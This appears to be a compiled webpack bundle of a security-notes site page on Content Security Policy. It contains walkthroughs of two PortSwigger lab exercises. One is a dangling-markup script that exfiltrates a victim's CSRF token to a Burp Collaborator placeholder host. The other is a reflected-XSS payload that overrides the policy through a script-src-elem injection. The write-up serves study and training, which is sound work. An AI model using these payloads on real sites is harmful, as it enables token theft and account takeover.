"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[883],{3905:function(e,t,n){n.d(t,{Zo:function(){return p},kt:function(){return h}});var i=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);t&&(i=i.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,i)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,i,a=function(e,t){if(null==e)return{};var n,i,a={},r=Object.keys(e);for(i=0;i<r.length;i++)n=r[i],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(i=0;i<r.length;i++)n=r[i],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var l=i.createContext({}),c=function(e){var t=i.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},p=function(e){var t=c(e.components);return i.createElement(l.Provider,{value:t},e.children)},d={inlineCode:"code",wrapper:function(e){var t=e.children;return i.createElement(i.Fragment,{},t)}},u=i.forwardRef((function(e,t){var n=e.components,a=e.mdxType,r=e.originalType,l=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),u=c(n),h=a,m=u["".concat(l,".").concat(h)]||u[h]||d[h]||r;return n?i.createElement(m,o(o({ref:t},p),{},{components:n})):i.createElement(m,o({ref:t},p))}));function h(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var r=n.length,o=new Array(r);o[0]=u;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s.mdxType="string"==typeof e?e:a,o[1]=s;for(var c=2;c<r;c++)o[c]=n[c];return i.createElement.apply(null,o)}return i.createElement.apply(null,n)}u.displayName="MDXCreateElement"},83183:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return c},toc:function(){return p},default:function(){return u}});var i=n(87462),a=n(63366),r=(n(67294),n(3905)),o=["components"],s={sidebar_position:10,image:"https://www.cloudflare.com/img/learning/security/threats/cross-site-scripting/xss-attack.png",tags:["CSP"]},l=void 0,c={unversionedId:"portswigger/XSS/Content-Security-Policy",id:"portswigger/XSS/Content-Security-Policy",title:"Content-Security-Policy",description:"Content security policy",source:"@site/docs/portswigger/XSS/Content-Security-Policy.md",sourceDirName:"portswigger/XSS",slug:"/portswigger/XSS/Content-Security-Policy",permalink:"/Cybernotes/docs/portswigger/XSS/Content-Security-Policy",tags:[{label:"CSP",permalink:"/Cybernotes/docs/tags/csp"}],version:"current",sidebarPosition:10,frontMatter:{sidebar_position:10,image:"https://www.cloudflare.com/img/learning/security/threats/cross-site-scripting/xss-attack.png",tags:["CSP"]},sidebar:"tutorialSidebar",previous:{title:"DOM-XSS-In-Third-Party-Apps",permalink:"/Cybernotes/docs/portswigger/XSS/DOM-XSS-In-Third-Party-Apps"},next:{title:"Exploiting cross-site scripting vulnerabilities",permalink:"/Cybernotes/docs/portswigger/XSS/Exploiting-XSS-Vulnerabilities"}},p=[{value:"Content security policy",id:"content-security-policy",children:[],level:2},{value:"What is CSP (content security policy)?",id:"what-is-csp-content-security-policy",children:[],level:2},{value:"Mitigating XSS attacks using CSP",id:"mitigating-xss-attacks-using-csp",children:[],level:2},{value:"Lab: Reflected XSS protected by very strict CSP, with dangling markup attack",id:"lab-reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack",children:[],level:2},{value:"Mitigating dangling markup attacks using CSP",id:"mitigating-dangling-markup-attacks-using-csp",children:[],level:2},{value:"Bypassing CSP with policy injection",id:"bypassing-csp-with-policy-injection",children:[],level:2},{value:"Lab: Reflected XSS protected by CSP, with CSP bypass",id:"lab-reflected-xss-protected-by-csp-with-csp-bypass",children:[],level:2},{value:"Protecting against clickjacking using CSP",id:"protecting-against-clickjacking-using-csp",children:[],level:2}],d={toc:p};function u(e){var t=e.components,s=(0,a.Z)(e,o);return(0,r.kt)("wrapper",(0,i.Z)({},d,s,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h2",{id:"content-security-policy"},"Content security policy"),(0,r.kt)("p",null,"Content security policy (",(0,r.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/cross-site-scripting/content-security-policy"},"CSP"),") is a browser mechanism that aims to mitigate the impact of cross-site scripting and some other vulnerabilities. If an application that employs CSP contains XSS-like behavior, then the CSP might hinder or prevent exploitation of the vulnerability. Often, the CSP can be circumvented to enable exploitation of the underlying vulnerability."),(0,r.kt)("h2",{id:"what-is-csp-content-security-policy"},"What is CSP (content security policy)?"),(0,r.kt)("p",null,"CSP is a browser security mechanism that aims to mitigate ",(0,r.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/cross-site-scripting"},"XSS")," and some other attacks. It works by restricting the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages."),(0,r.kt)("p",null,"To enable CSP, a response needs to include an HTTP response header called ",(0,r.kt)("inlineCode",{parentName:"p"},"Content-Security-Policy")," with a value containing the policy. The policy itself consists of one or more directives, separated by semicolons."),(0,r.kt)("h2",{id:"mitigating-xss-attacks-using-csp"},"Mitigating XSS attacks using CSP"),(0,r.kt)("p",null,"The following directive will only allow scripts to be loaded from the ",(0,r.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/cors/same-origin-policy"},"same origin")," as the page itself:"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"script-src 'self'")),(0,r.kt)("p",null,"The following directive will only allow scripts to be loaded from a specific domain:"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"script-src https://scripts.normal-website.com")),(0,r.kt)("p",null,"Care should be taken when allowing scripts from external domains. If there is any way for an attacker to control content that is served from the external domain, then they might be able to deliver an attack. For example, content delivery networks (CDNs) that do not use per-customer URLs, such as ",(0,r.kt)("inlineCode",{parentName:"p"},"ajax.googleapis.com"),", should not be trusted, because third parties can get content onto their domains."),(0,r.kt)("p",null,"In addition to whitelisting specific domains, content security policy also provides two other ways of specifying trusted resources: nonces and hashes:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"The CSP directive can specify a nonce (a random value) and the same value must be used in the tag that loads a script. If the values do not match, then the script will not execute. To be effective as a control, the nonce must be securely generated on each page load and not be guessable by an attacker."),(0,r.kt)("li",{parentName:"ul"},"The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, then the script will not execute. If the content of the script ever changes, then you will of course need to update the hash value that is specified in the directive.")),(0,r.kt)("p",null,"It's quite common for a CSP to block resources like ",(0,r.kt)("inlineCode",{parentName:"p"},"script"),". However, many CSPs do allow image requests. This means you can often use ",(0,r.kt)("inlineCode",{parentName:"p"},"img")," elements to make requests to external servers in order to disclose ",(0,r.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/csrf/tokens"},"CSRF tokens"),", for example."),(0,r.kt)("p",null,"Some browsers, such as Chrome, have built-in ",(0,r.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/cross-site-scripting/dangling-markup"},"dangling markup")," mitigation that will block requests containing certain characters, such as raw, unencoded new lines or angle brackets."),(0,r.kt)("p",null,"Some policies are more restrictive and prevent all forms of external requests. However, it's still possible to get round these restrictions by eliciting some user interaction. To bypass this form of policy, you need to inject an HTML element that, when clicked, will store and send everything enclosed by the injected element to an external server."),(0,r.kt)("h2",{id:"lab-reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack"},"Lab: Reflected XSS protected by very strict CSP, with dangling markup attack"),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"This lab using a strict ",(0,r.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/cross-site-scripting/content-security-policy"},"CSP")," that blocks outgoing requests to external web sites.\nTo solve the lab, perform a ",(0,r.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/cross-site-scripting"},"cross-site scripting")," attack that bypasses the CSP and exfiltrates the ",(0,r.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/csrf/tokens"},"CSRF token"),' using Burp Collaborator. You need to label your vector with the word "Click" in order to induce the simulated victim user to click it. For example:\n',(0,r.kt)("inlineCode",{parentName:"p"},'<a href="">Click me</a>'),"\nYou can log in to your own account using the following credentials: ",(0,r.kt)("inlineCode",{parentName:"p"},"wiener:peter"))),(0,r.kt)("p",null,"--\x3e So first i logged in as ",(0,r.kt)("inlineCode",{parentName:"p"},"wiener")," with password ",(0,r.kt)("inlineCode",{parentName:"p"},"peter")," because there were no search bar where i can search so let's login first to see more things . And also let's intercept the login response to see what are the policies defined in CSP."),(0,r.kt)("p",null,"And i found this:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"HTTP/1.1 302 Found\nLocation: /my-account\nSet-Cookie: session=6Rdm5ilHpeXUpVdbj5BxyhyBO20tB8UY; Secure; HttpOnly; SameSite=None\nContent-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';\nConnection: close\nContent-Length: 0\n")),(0,r.kt)("p",null,"I found some bypass scripts for these policies on google but none of them worked :("),(0,r.kt)("p",null,"You can find some resources here :"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass"},"https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://brutelogic.com.br/blog/csp-bypass-guidelines/"},"https://brutelogic.com.br/blog/csp-bypass-guidelines/"))),(0,r.kt)("p",null,"And after login i found that we can change our email so i intercepted the request for changing my email and i found that it's vulnerable to XSS (because portswigger said this!) so we have to use this functionality to steal the csrf token of the victim."),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"Note: store this request in repeater because in future we will use it!")),(0,r.kt)("p",null,"So i used this payload in our exploit server :"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-html"},'<script>\n  if (window.name) {\n    new Image().src =\n      "//your-collaborator-id.burpcollaborator.net?" +\n      encodeURIComponent(window.name);\n  } else {\n    location =\n      "https://your-lab-id.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://your-exploit-server-id.web-security-academy.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27";\n  }\n<\/script>\n')),(0,r.kt)("p",null,"After URL decode:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-html"},"<script>\n  if(window.name) {\n    new Image().src='//your-collaborator-id.burpcollaborator.net?' encodeURIComponent(window.name);\n    }\n  else {\n    location = 'https://your-lab-id.web-security-academy.net/my-account?email=\"><a href=\"https://your-exploit-server-id.web-security-academy.net/exploit\">Click me</a><base target='';\n  }\n<\/script>\n")),(0,r.kt)("p",null,"Let's understand the code step by step:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"first we are checking if there is a current window name exists or not which we can get by ",(0,r.kt)("inlineCode",{parentName:"li"},"window.name"),". If it exists then we will create one new image with src of our collaborator link. learn more about ",(0,r.kt)("inlineCode",{parentName:"li"},"window.name")," ",(0,r.kt)("a",{parentName:"li",href:"https://developer.mozilla.org/en-US/docs/Web/API/Window/name#syntax"},"here")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("inlineCode",{parentName:"li"},"encodeURIComponent")," will URL encode the window.name. Learn more about it ",(0,r.kt)("a",{parentName:"li",href:"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/encodeURIComponent"},"here")),(0,r.kt)("li",{parentName:"ul"},"and if there is no ",(0,r.kt)("inlineCode",{parentName:"li"},"window.name")," exist then we will redirect the victim to our lab's change email URL. with our payload as ",(0,r.kt)("inlineCode",{parentName:"li"},"email"),". and our payload is a simple anchor tag which contains our exploit server's url as ",(0,r.kt)("inlineCode",{parentName:"li"},"href"))),(0,r.kt)("div",{className:"admonition admonition-tip alert alert--success"},(0,r.kt)("div",{parentName:"div",className:"admonition-heading"},(0,r.kt)("h5",{parentName:"div"},(0,r.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,r.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"12",height:"16",viewBox:"0 0 12 16"},(0,r.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"}))),"tip")),(0,r.kt)("div",{parentName:"div",className:"admonition-content"},(0,r.kt)("p",{parentName:"div"},"You can get your burp collaborator id by going to ",(0,r.kt)("inlineCode",{parentName:"p"},"burp -> burp collaborator client -> copy to clipboard")))),(0,r.kt)("p",null,"--\x3e Click ",(0,r.kt)("inlineCode",{parentName:"p"},"store")," and then click ",(0,r.kt)("inlineCode",{parentName:"p"},"send exploit to Victim")),(0,r.kt)("p",null,"--\x3e After that check for requests in collaborator client tab by clicking ",(0,r.kt)("inlineCode",{parentName:"p"},"poll now")," and you will see one request."),(0,r.kt)("p",null,"And we got the CSRF token of victim!"),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(90281).Z,width:"1353",height:"897"})),(0,r.kt)("p",null,"--\x3e Now the next step is to generate CSRF poc to use this CSRF token and for that first go back to the change email request which we stored in repeater and do ",(0,r.kt)("inlineCode",{parentName:"p"},"right click -> generate CSRF Poc")," and change the CSRF token and also goto ",(0,r.kt)("inlineCode",{parentName:"p"},"options")," tab and select ",(0,r.kt)("inlineCode",{parentName:"p"},"Include auto submit script")," to auto submit the script when loaded."),(0,r.kt)("p",null,"Now click ",(0,r.kt)("inlineCode",{parentName:"p"},"regenerate")," and ",(0,r.kt)("inlineCode",{parentName:"p"},"copy HTML")),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(34151).Z,width:"1109",height:"857"})),(0,r.kt)("p",null,"--\x3e Now we will paste this HTML in our exploit server and click ",(0,r.kt)("inlineCode",{parentName:"p"},"store")," and ",(0,r.kt)("inlineCode",{parentName:"p"},"send exploit to Victim")),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(14084).Z,width:"1767",height:"871"})),(0,r.kt)("p",null,"And we solved the lab!"),(0,r.kt)("h2",{id:"mitigating-dangling-markup-attacks-using-csp"},"Mitigating dangling markup attacks using CSP"),(0,r.kt)("p",null,"The following directive will only allow images to be loaded from the same origin as the page itself:"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"img-src 'self'")),(0,r.kt)("p",null,"The following directive will only allow images to be loaded from a specific domain:"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"img-src https://images.normal-website.com")),(0,r.kt)("p",null,"Note that these policies will prevent some dangling markup exploits, because an easy way to capture data with no user interaction is using an ",(0,r.kt)("inlineCode",{parentName:"p"},"img")," tag. However, it will not prevent other exploits, such as those that inject an anchor tag with a dangling ",(0,r.kt)("inlineCode",{parentName:"p"},"href")," attribute."),(0,r.kt)("h2",{id:"bypassing-csp-with-policy-injection"},"Bypassing CSP with policy injection"),(0,r.kt)("p",null,"You may encounter a website that reflects input into the actual policy, most likely in a ",(0,r.kt)("inlineCode",{parentName:"p"},"report-uri")," directive. If the site reflects a parameter that you can control, you can inject a semicolon to add your own CSP directives. Usually, this ",(0,r.kt)("inlineCode",{parentName:"p"},"report-uri")," directive is the final one in the list. This means you will need to overwrite existing directives in order to exploit this vulnerability and bypass the policy."),(0,r.kt)("p",null,"Normally, it's not possible to overwrite an existing ",(0,r.kt)("inlineCode",{parentName:"p"},"script-src")," directive. However, Chrome recently introduced the ",(0,r.kt)("inlineCode",{parentName:"p"},"script-src-elem")," directive, which allows you to control ",(0,r.kt)("inlineCode",{parentName:"p"},"script")," elements, but not events. Crucially, this new directive allows you to overwrite existing ",(0,r.kt)("inlineCode",{parentName:"p"},"script-src")," directives. Using this knowledge, you should be able to solve the following lab."),(0,r.kt)("h2",{id:"lab-reflected-xss-protected-by-csp-with-csp-bypass"},"Lab: Reflected XSS protected by CSP, with CSP bypass"),(0,r.kt)("blockquote",null,(0,r.kt)("p",{parentName:"blockquote"},"This lab uses ",(0,r.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/cross-site-scripting/content-security-policy"},"CSP")," and contains a ",(0,r.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/cross-site-scripting/reflected"},"reflected XSS")," vulnerability.\nTo solve the lab, perform a ",(0,r.kt)("a",{parentName:"p",href:"https://portswigger.net/web-security/cross-site-scripting"},"cross-site scripting")," attack that bypasses the CSP and calls the ",(0,r.kt)("inlineCode",{parentName:"p"},"alert")," function.\nPlease note that the intended solution to this lab is only possible in Chrome.")),(0,r.kt)("p",null,"--\x3e So first we have search functionality so i searched for ",(0,r.kt)("inlineCode",{parentName:"p"},"hacker")," and intercepted the request and response"),(0,r.kt)("div",{className:"admonition admonition-tip alert alert--success"},(0,r.kt)("div",{parentName:"div",className:"admonition-heading"},(0,r.kt)("h5",{parentName:"div"},(0,r.kt)("span",{parentName:"h5",className:"admonition-icon"},(0,r.kt)("svg",{parentName:"span",xmlns:"http://www.w3.org/2000/svg",width:"12",height:"16",viewBox:"0 0 12 16"},(0,r.kt)("path",{parentName:"svg",fillRule:"evenodd",d:"M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"}))),"tip")),(0,r.kt)("div",{parentName:"div",className:"admonition-content"},(0,r.kt)("p",{parentName:"div"},"You can intercept response by right clicking on request and then going to ",(0,r.kt)("inlineCode",{parentName:"p"},"Do intercept->response to this request")))),(0,r.kt)("p",null,"And i found this content-security-policy!"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=\n")),(0,r.kt)("p",null,"If we look closely then we can see that there is a one directory called ",(0,r.kt)("inlineCode",{parentName:"p"},"/csp-report")," which is taking ",(0,r.kt)("inlineCode",{parentName:"p"},"token")," parameter. So i went to that directory and added ",(0,r.kt)("inlineCode",{parentName:"p"},"1234")," in token parameter and i found that it was getting reflected in CSP!!"),(0,r.kt)("p",null,(0,r.kt)("img",{src:n(99747).Z,width:"1433",height:"341"})),(0,r.kt)("p",null,"--\x3e So using this parameter we can change or overwrite the CSP."),(0,r.kt)("p",null,"So i searched on google for ",(0,r.kt)("inlineCode",{parentName:"p"},"policy injection")," methods and i found these 2 amazing blogs:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://portswigger.net/research/bypassing-csp-with-policy-injection"},"https://portswigger.net/research/bypassing-csp-with-policy-injection")),(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("a",{parentName:"li",href:"https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass"},"https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass"))),(0,r.kt)("p",null,"--\x3e So i added simple xss payload in ",(0,r.kt)("inlineCode",{parentName:"p"},"search")," parameter and tried to add different rules in ",(0,r.kt)("inlineCode",{parentName:"p"},"token")," parameter which were mentioned in hacktricks website and the below payload worked for me:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"?search=<script>alert(document.domain)<\/script>&token=;script-src-elem 'unsafe-inline'\n")),(0,r.kt)("p",null,"And we solved the lab!"),(0,r.kt)("h2",{id:"protecting-against-clickjacking-using-csp"},"Protecting against ",(0,r.kt)("a",{parentName:"h2",href:"https://portswigger.net/web-security/clickjacking"},"clickjacking")," using CSP"),(0,r.kt)("p",null,"The following directive will only allow the page to be framed by other pages from the same origin:"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"frame-ancestors 'self'")),(0,r.kt)("p",null,"The following directive will prevent framing altogether:"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"frame-ancestors 'none'")),(0,r.kt)("p",null,"Using content security policy to prevent clickjacking is more flexible than using the X-Frame-Options header because you can specify multiple domains and use wildcards. For example:"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"frame-ancestors 'self' https://normal-website.com https://*.robust-website.com")),(0,r.kt)("p",null,"CSP also validates each frame in the parent frame hierarchy, whereas ",(0,r.kt)("inlineCode",{parentName:"p"},"X-Frame-Options")," only validates the top-level frame."),(0,r.kt)("p",null,"Using CSP to protect against clickjacking attacks is recommended. You can also combine this with the ",(0,r.kt)("inlineCode",{parentName:"p"},"X-Frame-Options")," header to provide protection on older browsers that don't support CSP, such as Internet Explorer."))}u.isMDXComponent=!0},90281:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220315135740-e3468e0a8cbf4d9fe19af3f162ebf864.png"},34151:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220315135849-80ad407ff64a2bf0ea29306ef0b855b1.png"},14084:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220315135919-d7c63b06290a3a0d418114db215b577a.png"},99747:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220316134533-fa9e77146467f7418f5c0ad185df2d59.png"}}]);